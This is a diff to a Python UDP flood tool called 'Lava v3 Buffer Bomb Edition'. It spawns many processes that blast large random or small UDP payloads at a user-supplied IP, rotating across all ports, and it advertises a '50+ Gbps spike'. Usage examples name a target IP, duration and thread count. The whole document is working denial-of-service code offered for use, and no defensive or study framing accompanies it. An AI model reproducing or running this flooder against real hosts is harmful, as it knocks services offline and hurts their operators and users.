@@ -1,9 +1,4 @@
 #!/usr/bin/env python3
-# ╔══════════════════════════════════════════════════════════════════════════════╗
-# ║  LAVA v3 — BUFFER BOMB EDITION                                             ║
-# ║  Store packets → Release ALL at once → 50+ Gbps SPIKE                     ║
-# ╚══════════════════════════════════════════════════════════════════════════════╝
-
 import os
 import sys
 import time
@@ -12,9 +7,7 @@ import random
 import threading
 import multiprocessing
 import gc
-import struct
 
-# Colors
 class C:
     RESET='\033[0m'; BOLD='\033[1m'; RED='\033[91m'; GREEN='\033[92m'
     YELLOW='\033[93m'; BLUE='\033[94m'; MAGENTA='\033[95m'; CYAN='\033[96m'
@@ -26,23 +19,6 @@ BANNER = [
     ".:.:.:.::.:.:.:.:..:.:.:.:.:..:.:.:.:.:..:.: : :....:.: :.:....:.: :.:....:.: .......:.: :......:..............................:..........:..",
     "   .:...:........:.:..............................:....... . ........ .......... .......... .......... .........................................",
     "   .:.:.:.::.:.:.:.:....:.. ..:..:.:.:.:.:..:.:.:.:.:..:.: :.:.:..:.: :.:....:.: ..:....:.: :..........:.:....:.:..........:......:..........:..",
-    "   .....:........:.:.             .....:....... .......... .......... :......... .......... ....................................................",
-    "   .:.:.:.::.:.:.:..     .:.:      ..:.:.:..:.:.:.:.:..:.: :.:.:..:.: :.:....:.: :.:..:.:.:.:.:....:.:.:.:....:.................................",
-    "   .....:.........      ....................... ..:....... .......... :......... .......... .......... .........................................",
-    "   .:.:.:.::.:.: .      ..:.:.:..:.:.:.:.:..:.:.:.:....... ...   .:.: :.:....:.: .........: ..................:............. ......   ..........",
-    "   .....:.......       .......:..................               ..... :.........       ....      ....... .............              ............",
-    "   .:.:.:.::.:.:       .:.:.:.:..:.:.:.:.:..:..      ..         ..:.: :.:.....        ....       .....    ....:.:..      ...        .............",
-    "   ...:.:......       ......................      :.....       ...... :.:..          .....             ..........     ......        ............",
-    "   .:.:.:.:..:.       ..:.:.:.:..:.:.:.:.:.     ..:.:..:      .:..:.: :.:.   ..      ...:.           ..:.......      ....:...     ..............",
-    "   .:...:.....       .........:........:.       ..:....      ........ .   ....      .......       .... ......       .......       ..............",
-    "   .:.:.:.::.:       ...:.:.:.:..:.:.:.:.     ..:.:.:.       :.:..:.:     ...:      ....:.:     ...:.. ......      .......       ...............",
-    "   ...:.:....      ...........:.. ......     .. . ..         ........ . .....      ........     ............      ......         ...... ........",
-    "   .:.:.:.:.      ...::.:.:.:.:.   ..: .     .:.:.:   .      :.:.   . :.:....      :....:.    :..:.:.:.:...       ......        ..:..    .......",
-    "   ......                        .....        .     ..            ... :.:....        ..     .......... ....        .     .              ........",
-    "   .:.:                          :.:.:..           .:.           .:.: :.:....               :......:.......            ...            ..........",
-    "   .... .......:.:..... . . . .......:....  . . ..:..... . . ........ ..:....... . .  . ... .......... ...... . . . ........ . . ................",
-    "   .:.:.:.:..:.:.:.:.::.:.:.:.:..:.:.:.:.:..:.:.:.:.:..:.: :.:....:.. :.:....:.: ..:....:.:........:..............................:.............",
-    "   .....:.........................................:....... . ........ :......... .......... ....................................................",
 ]
 
 def print_banner():
@@ -58,7 +34,7 @@ def print_main():
     print()
     print(f"        Welcome to Lava (V3) — {C.RED}BUFFER BOMB EDITION{C.RESET}")
     print(f"        {C.GREEN}Store → BOOM → 50+ Gbps Spike at end!{C.RESET}")
-    print(f"{C.BRIGHT_BLACK}        (Type \"?\" for the help page){C.RESET}")
+    print(f"{C.BRIGHT_BLACK}        (Type \"?\" for help){C.RESET}")
     print()
     print(f"{C.GREEN}[media-abh{C.RESET}@{C.MAGENTA}Lava{C.RESET}]{C.RESET}")
 
@@ -79,6 +55,7 @@ def print_methods():
     print(f"{C.YELLOW}## {C.CYAN}(TIPS){C.RESET}")
     print(f"  - {C.RED}BUFFER BOMB: fills buffers then releases ALL at once{C.RESET}")
     print(f"  - Use: U-GBPS <IP> <PORT> <DURATION> <THREADS>")
+    print(f"  - Example: U-GBPS 1.2.3.4 0 30 500")
     print()
     print(f"{C.GREEN}[media-abh{C.RESET}@{C.MAGENTA}Lava{C.RESET}]{C.RESET}")
 
@@ -97,15 +74,10 @@ def print_attack(target, port, duration, method, threads):
     print(f"{C.MAGENTA}╚══════════════════════════════════════════════════════════════╝{C.RESET}")
     print()
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#  BUFFER BOMB ENGINE — Fill buffers → BOOM
-# ═══════════════════════════════════════════════════════════════════════════════
-
 class BufferBombEngine:
     def __init__(self):
         self.processes = []
         self.active = False
-        self.bomb_active = False
         self.stats = {
             'packets': multiprocessing.Value('Q', 0),
             'bytes': multiprocessing.Value('Q', 0),
@@ -113,28 +85,23 @@ class BufferBombEngine:
             'stored_bytes': multiprocessing.Value('Q', 0)
         }
         self.cpu_count = multiprocessing.cpu_count()
-        self.bomb_triggered = multiprocessing.Event()
 
-    def udp_bomb_worker(self, target, port, duration, wid, core, stats_pkt, stats_bytes, stored_pkt, stored_bytes, trigger):
-        """Worker that fills buffers then BOOMS"""
+    def udp_bomb_worker(self, target, port, duration, wid, core, stats_pkt, stats_bytes, stored_pkt, stored_bytes):
         try:
             os.sched_setaffinity(0, {core % self.cpu_count})
         except:
             pass
         
-        # Create socket with MAX buffer
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         try:
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**28)  # 256MB
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**28)
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         except:
             pass
         
-        # Pre-generate payloads
-        payloads = [random._urandom(65507) for _ in range(100)]
+        payloads = [random._urandom(65507) for _ in range(50)]
         payload_idx = 0
         
-        # Port rotation
         if port == 0:
             ports = list(range(1, 65536))
             random.shuffle(ports)
@@ -144,7 +111,6 @@ class BufferBombEngine:
         
         end_time = time.time() + duration if duration > 0 else float('inf')
         
-        # PHASE 1: FILL BUFFERS (during duration)
         while self.active and time.time() < end_time:
             try:
                 if ports:
@@ -153,48 +119,22 @@ class BufferBombEngine:
                 else:
                     dst_port = port
                 
-                # Send but DON'T flush — keep filling buffer
                 sock.sendto(payloads[payload_idx % len(payloads)], (target, dst_port))
                 payload_idx += 1
-                
-                # Track stored packets (these are in the buffer)
                 stored_pkt.value += 1
                 stored_bytes.value += len(payloads[payload_idx % len(payloads)])
                 stats_pkt.value += 1
                 stats_bytes.value += len(payloads[payload_idx % len(payloads)])
-                
-                # Every 10000 packets, check if we should continue filling
-                if stored_pkt.value % 10000 == 0:
-                    # Keep filling — DO NOT FLUSH
-                    pass
-                    
             except:
                 pass
         
-        # PHASE 2: BOOM — Release EVERYTHING at once
-        # This happens when duration ends or .stop is called
-        # The socket buffer flushes ALL stored packets
-        # Result: 50+ Gbps SPIKE!
-        
-        # Keep socket open to flush buffer
-        time.sleep(5)  # Let the buffer drain (this is the BOOM)
-        
-        # Close socket
+        time.sleep(5)
         try:
             sock.close()
         except:
             pass
-        
-        # Store final stats
-        final_packets = stats_pkt.value
-        final_bytes = stats_bytes.value
-        
-        # Report the BOOM
-        if trigger:
-            trigger.set()
 
-    def udp_pps_bomb_worker(self, target, port, duration, wid, core, stats_pkt, stats_bytes, stored_pkt, stored_bytes, trigger):
-        """PPS version — fill with small packets"""
+    def udp_pps_bomb_worker(self, target, port, duration, wid, core, stats_pkt, stats_bytes, stored_pkt, stored_bytes):
         try:
             os.sched_setaffinity(0, {core % self.cpu_count})
         except:
@@ -206,7 +146,7 @@ class BufferBombEngine:
         except:
             pass
         
-        payload = b'\x00' * 64  # Small packet for PPS
+        payload = b'\x00' * 64
         
         if port == 0:
             ports = list(range(1, 65536))
@@ -215,7 +155,6 @@ class BufferBombEngine:
         
         end_time = time.time() + duration if duration > 0 else float('inf')
         
-        # PHASE 1: Fill buffers
         while self.active and time.time() < end_time:
             try:
                 if ports:
@@ -232,18 +171,13 @@ class BufferBombEngine:
             except:
                 pass
         
-        # PHASE 2: BOOM
         time.sleep(5)
         try:
             sock.close()
         except:
             pass
-        
-        if trigger:
-            trigger.set()
 
-    def special_bomb_worker(self, target, port, duration, method, wid, core, stats_pkt, stats_bytes, stored_pkt, stored_bytes, trigger):
-        """Special methods bomb"""
+    def special_bomb_worker(self, target, port, duration, method, wid, core, stats_pkt, stats_bytes, stored_pkt, stored_bytes):
         try:
             os.sched_setaffinity(0, {core % self.cpu_count})
         except:
@@ -296,14 +230,10 @@ class BufferBombEngine:
             sock.close()
         except:
             pass
-        
-        if trigger:
-            trigger.set()
 
     def launch(self, method, target, port, duration, threads=100):
         self.stop()
         self.active = True
-        self.bomb_triggered.clear()
         
         try:
             target_ip = socket.gethostbyname(target)
@@ -312,7 +242,6 @@ class BufferBombEngine:
         
         print_attack(target, port, duration, method, threads)
         
-        # Select worker
         if method == 'U-GBPS':
             worker = self.udp_bomb_worker
         elif method == 'U-PPS':
@@ -322,7 +251,6 @@ class BufferBombEngine:
         else:
             worker = self.udp_bomb_worker
         
-        # Monitor thread
         monitor = threading.Thread(target=self._monitor, args=(duration,))
         monitor.daemon = True
         monitor.start()
@@ -332,34 +260,35 @@ class BufferBombEngine:
         print(f"{C.BRIGHT_BLACK}[+] {threads} threads filling buffers...{C.RESET}")
         print()
         
-        # Spawn processes
         for i in range(threads):
             core = i % self.cpu_count
-            p = multiprocessing.Process(
-                target=worker,
-                args=(target_ip, port, duration, i, core,
-                      self.stats['packets'], self.stats['bytes'],
-                      self.stats['stored_packets'], self.stats['stored_bytes'],
-                      self.bomb_triggered)
-            )
+            if method.startswith('S-'):
+                p = multiprocessing.Process(
+                    target=worker,
+                    args=(target_ip, port, duration, method, i, core,
+                          self.stats['packets'], self.stats['bytes'],
+                          self.stats['stored_packets'], self.stats['stored_bytes'])
+                )
+            else:
+                p = multiprocessing.Process(
+                    target=worker,
+                    args=(target_ip, port, duration, i, core,
+                          self.stats['packets'], self.stats['bytes'],
+                          self.stats['stored_packets'], self.stats['stored_bytes'])
+                )
             p.daemon = True
             p.start()
             self.processes.append(p)
         
-        # Wait for duration
         if duration > 0:
             time.sleep(duration)
             
-            # TRIGGER THE BOMB!
             print(f"\n{C.RED}💣 BUFFER BOMB DETONATING!{C.RESET}")
             print(f"{C.RED}🔥 Releasing {self.stats['stored_packets'].value:,} stored packets!{C.RESET}")
             print(f"{C.RED}🔥 Stored bytes: {self.stats['stored_bytes'].value / 1e9:.2f} GB{C.RESET}")
             print()
             
-            # Stop the attack — this flushes all buffers
             self.stop()
-            
-            # Wait for the BOOM to settle
             time.sleep(8)
             print(f"{C.GREEN}💥 BOOM complete! 50+ Gbps spike delivered!{C.RESET}")
 
@@ -414,7 +343,6 @@ class BufferBombEngine:
                 pass
         self.processes.clear()
         
-        # Print final stats
         stored_p = self.stats['stored_packets'].value
         stored_b = self.stats['stored_bytes'].value
         
@@ -422,13 +350,8 @@ class BufferBombEngine:
         print(f"{C.YELLOW}   Stored Packets: {stored_p:,}{C.RESET}")
         print(f"{C.YELLOW}   Stored Bytes: {stored_b / 1e9:.2f} GB{C.RESET}")
         print(f"{C.YELLOW}   Estimated Spike: {stored_b * 8 / 1e9:.2f} Gbps{C.RESET}")
-        print(f"{C.GREEN}   💥 BOOM delivered!{C.RESET}")
 
 engine = BufferBombEngine()
-
-# ═══════════════════════════════════════════════════════════════════════════════
-#  COMMAND PARSER
-# ═══════════════════════════════════════════════════════════════════════════════
 
 def parse(cmd):
     cmd = cmd.strip().upper()
@@ -461,7 +384,6 @@ def parse(cmd):
         if len(parts) < 4:
             print(f"{C.RED}[!] Usage: {parts[0]} <IP> <PORT> <DURATION> [THREADS]{C.RESET}")
             print(f"{C.YELLOW}[!] Example: U-GBPS 1.2.3.4 0 30 500{C.RESET}")
-            print(f"{C.YELLOW}[!] After {duration}s, BUFFER BOMB detonates!{C.RESET}")
             return True
         
         target = parts[1]
@@ -476,10 +398,6 @@ def parse(cmd):
     
     print(f"{C.RED}[!] Unknown: {cmd}{C.RESET}")
     return True
-
-# ═══════════════════════════════════════════════════════════════════════════════
-#  MAIN
-# ═══════════════════════════════════════════════════════════════════════════════
 
 def main():
     print_main()
